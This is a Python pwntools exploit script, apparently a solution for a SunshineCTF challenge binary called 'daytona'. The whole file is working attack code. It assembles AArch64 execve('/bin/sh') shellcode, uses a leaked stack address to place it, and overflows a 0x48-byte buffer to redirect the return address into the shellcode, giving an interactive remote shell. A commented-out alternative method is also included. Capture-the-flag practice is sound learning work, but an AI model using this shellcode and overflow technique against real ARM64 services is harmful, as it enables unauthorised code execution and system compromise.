#!/usr/bin/env python3
from pwn import *

context.arch = 'aarch64'
exe = ELF('daytona', checksec = False)
context.binary = exe

p = remote('chal.sunshinectf.games', 25606)
# p = process([exe.path])

p.recvuntil(b'going ')

shellcode = asm(
    ''' 
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68,   lsl #48
    str  x1, [sp, #-8]!
    mov  x0, sp
    mov  x1, xzr
    str  x1, [sp, #-8]!
    str  x0, [sp, #-8]!
    mov  x1, sp
    mov  x2, xzr
    mov  x8, #221
    svc  0
    ''', arch='aarch64'
)

# {
# cách 1
# stack_leak = int(p.recv(12), 10)
# log.info("stack leak: " + hex(stack_leak))

# write_addr = stack_leak + 117
# log.info("calculated buffer start (v1): " + hex(write_addr))

# while True:
#     if b"\n" in p64(write_addr):
#         payload = shellcode
#         payload = payload.ljust(0x48, b'\0')
#         payload += p64(exe.sym.main + 8)
#         p.sendlineafter(b'them??\n', payload)
#         p.recvuntil(b'going ')
#         write_addr = int(p.recv(12), 10) + 117
#         info(f"Stack leak: {write_addr:#x}")
#     else:
#         break
# payload = shellcode
# payload = payload.ljust(0x48, b'\0')
# payload += p64(write_addr)      

# p.sendlineafter(b'them??\n', payload)
# }


# cách 2
stack_leak = int(p.recv(12), 10)
log.info("stack leak: " + hex(stack_leak))

write_addr = stack_leak + 0xc5
log.info("calculated buffer start (v1): " + hex(write_addr))
payload = shellcode
payload = payload.ljust(0x48, b'\0')
payload += p64(write_addr) + shellcode        

p.sendlineafter(b'them??\n', payload)


p.interactive()